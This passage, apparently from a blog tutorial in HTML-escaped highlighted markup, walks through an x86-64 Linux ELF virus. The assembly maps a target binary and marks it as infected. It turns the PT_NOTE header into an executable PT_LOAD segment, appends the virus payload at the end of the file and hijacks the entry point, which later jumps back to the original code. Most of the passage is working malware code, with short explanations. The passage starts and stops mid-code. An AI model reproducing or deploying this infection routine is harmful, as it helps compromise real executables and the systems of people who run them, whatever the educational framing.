&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;                     &lt;span style=&#34;color:#75715e&#34;&gt;; We map the file into memory to operate on it&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    al, al
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jnz&lt;/span&gt;     close_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map], rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_ident &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; EI_PAD], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; INFECTION_MAGIC &lt;span style=&#34;color:#75715e&#34;&gt;; Mark binary for infection&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr], &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r8, rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     r8, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_phoff]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;movzx&lt;/span&gt;   rcx, &lt;span style=&#34;color:#66d9ef&#34;&gt;WORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_phnum]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loop_phdrs:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_type], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; PT_NOTE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     cmp_load_phdr
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr], r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cmp_load_phdr:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;cmp&lt;/span&gt;     [r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_type], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; PT_LOAD
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jne&lt;/span&gt;     next_phdr
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_last_pt_load], r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;next_phdr:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     r8w, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_phentsize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;loop&lt;/span&gt;    loop_phdrs
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;check_if_note_exists:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rax, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    rax, rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jz&lt;/span&gt;      munmap_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This next code chunk is gonna map the file into memory and get some information that are gonna be useful for the infection routine such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the file size&lt;/li&gt;
&lt;li&gt;the &lt;code&gt;PT_NOTE&lt;/code&gt; phdr address&lt;/li&gt;
&lt;li&gt;the last &lt;code&gt;PT_LOAD&lt;/code&gt; phdr address&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;infection&#34;&gt;Infection&lt;/h3&gt;
&lt;p&gt;Once we have every needed information, we can get to the serious part.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;patch_note_phdr:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rax, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_type], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; PT_LOAD       &lt;span style=&#34;color:#75715e&#34;&gt;; We make it loadable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_flags], &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; PF_R &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PF_X  &lt;span style=&#34;color:#75715e&#34;&gt;; And executable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]     &lt;span style=&#34;color:#75715e&#34;&gt;; It starts at the EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_offset], rdx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_filesz], virus_len   &lt;span style=&#34;color:#75715e&#34;&gt;; We update the sizes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_memsz], virus_len
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_align], &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;       &lt;span style=&#34;color:#75715e&#34;&gt;; And the alignement&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_last_pt_load]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rcx, [rdx &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_vaddr]                &lt;span style=&#34;color:#75715e&#34;&gt;; we get the last page used&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;and&lt;/span&gt;     cx, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf000&lt;/span&gt;                          &lt;span style=&#34;color:#75715e&#34;&gt;; we align the address on page border&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rcx, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]           &lt;span style=&#34;color:#75715e&#34;&gt;; and we add the file size to it so that&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                &lt;span style=&#34;color:#75715e&#34;&gt;; it will be on another page and also to keep&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                &lt;span style=&#34;color:#75715e&#34;&gt;; offset and address consistent&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_vaddr], rcx                &lt;span style=&#34;color:#75715e&#34;&gt;; We put it after the last address mapped into memory&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_paddr], rcx                &lt;span style=&#34;color:#75715e&#34;&gt;; but we have to align it on another page&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rax, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]                &lt;span style=&#34;color:#75715e&#34;&gt;; We convert our infected segment&amp;#39;s address to&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr], rax            &lt;span style=&#34;color:#75715e&#34;&gt;; an offset in case remapping changes the map address&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is the code that will handle the &lt;code&gt;PT_NOTE&lt;/code&gt; hijacking. If we want our program to execute, we need the new &lt;code&gt;PT_LOAD&lt;/code&gt; header to be valid so we will have to change a lot of its fields.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;p_type&lt;/code&gt;: We will switch it from &lt;code&gt;PT_NOTE&lt;/code&gt; to &lt;code&gt;PT_LOAD&lt;/code&gt; to tell the system that we want to map our code into the memory.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p_flags&lt;/code&gt;: For &lt;code&gt;PT_LOAD&lt;/code&gt; segments, this field is used to define the permissions that will be granted to our segment. We will give it read and execute permissions because that&amp;rsquo;s all ot needs.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p_offset&lt;/code&gt;: This field defines here the segment starts, since we are gonna put our code at the end of the file, we will put the file size value here.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p_file/memsz&lt;/code&gt;: Those are used to tell the system the place it needs to reserve in memory and how many bytes of the file it has to put in. We will define both as the virus length (We will see how to get it later)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p_p/vaddr&lt;/code&gt;: Those are the physical and virtual addresses where the segment will be mapped. It is said in the man that &lt;code&gt;Loadable process segments must have congruent values for p_vaddr and p_offset, modulo the page size.&lt;/code&gt; so we will take the page right after the last already existing &lt;code&gt;PT_LOAD&lt;/code&gt; and then add it the file size so that we are sure that he offset and addresses values have congruent values.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p_align&lt;/code&gt;: Loadable segments are aligned on memory pages so we will change it to the usual size of a page (0x1000 bytes)&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;adjust_file_size:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rsi, virus_len
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_new_filesize], rsi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_FTRUNCATE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jnz&lt;/span&gt;     munmap_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_new_filesize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r10, r10
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     r10b, MREMAP_MAYMOVE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MREMAP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    al, al
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jnz&lt;/span&gt;     munmap_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map], rax            &lt;span style=&#34;color:#75715e&#34;&gt;; This might break the reference to the phdrs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                            &lt;span style=&#34;color:#75715e&#34;&gt;; but they are not needed anymore&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rsi, [rel _start]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rcx, virus_len
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;copy_payload:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lodsb&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;stosb&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;loop&lt;/span&gt;    copy_payload
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;patch_entrypoint:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r8, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rax, r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rax, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, [r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_entry]          &lt;span style=&#34;color:#75715e&#34;&gt;; We save the old entrypoint&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rcx, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_vaddr]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_entry], rcx    &lt;span style=&#34;color:#75715e&#34;&gt;; We change the entrypoint to our code&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rcx, final_jmp_offset        &lt;span style=&#34;color:#75715e&#34;&gt;; The address to patch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rdx, rcx                     &lt;span style=&#34;color:#75715e&#34;&gt;; We have the relative jump&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rcx, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_offset]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rcx, r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rcx, final_jmp_offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;; The file offset of the address to patch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; [rcx], edx             &lt;span style=&#34;color:#75715e&#34;&gt;; We return to the original entrypoint&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;munmap_quit_infect:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MSYNC
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MUNMAP
